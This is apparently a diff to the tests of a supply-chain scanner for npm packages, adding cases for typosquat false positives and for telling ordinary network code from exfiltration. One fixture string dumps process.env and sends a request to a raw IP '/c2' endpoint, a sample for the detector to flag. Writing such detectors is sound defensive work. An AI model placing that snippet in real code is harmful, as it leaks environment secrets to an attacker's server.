@@ -50,11 +50,18 @@ test("typosquat of a very popular package flags high", () => {
   expect(idsOf(s)).toContain("low-install-history");
 });
 
-test("delimiter variant of a real package is only a low-weight signal", () => {
-  const s = analyze(base({ name: "class-names", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 5_000_000 } }));
+test("delimiter variant (low-download squat) is only a low-weight signal", () => {
+  // A squat impersonating classnames would have low downloads; that is when the
+  // delimiter-variant signal applies. (An ESTABLISHED class-names is exempt — see below.)
+  const s = analyze(base({ name: "class-names", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 30 } }));
   const t = s.find((x) => x.category === "typosquat");
   expect(t?.id).toBe("delimiter-variant");
   expect(t!.weight).toBeLessThan(40);
+});
+
+test("an established package is never flagged as a typosquat (got FP fix)", () => {
+  const s = analyze(base({ name: "got", meta: { maintainers: ["sindresorhus"], existsOnRegistry: true, weeklyDownloads: 10_000_000 } }));
+  expect(s.find((x) => x.category === "typosquat")).toBeUndefined();
 });
 
 test("nonexistent name is a slopsquat block-weight signal", () => {
@@ -78,6 +85,28 @@ test("provenance downgrade + maintainer change flag", () => {
   );
   expect(idsOf(s)).toContain("provenance-downgrade");
   expect(idsOf(s)).toContain("maintainer-changed");
+});
+
+test("bare network + env (no raw IP) is NOT an action signal", () => {
+  // The express/request false-positive fix: using http/https and reading env is
+  // ubiquitous in legit code and must not by itself create a blocking signal.
+  const s = analyze(
+    base({
+      name: "some-http-lib",
+      meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 100 },
+      scanFiles: [{ path: "index.js", text: "const https=require('https');const p=process.env.PORT;https.get('https://api.example.com');" }],
+    }),
+  );
+  expect(s.filter((x) => x.action)).toHaveLength(0);
+});
+
+test("env dump + raw IP together IS an exfiltration signal", () => {
+  const s = analyze(
+    base({
+      scanFiles: [{ path: "x.js", text: "const t=JSON.stringify(process.env);require('https').request('http://185.62.1.9/c2');" }],
+    }),
+  );
+  expect(idsOf(s)).toContain("exfil-shape");
 });
 
 test("clean package yields no action signals", () => {
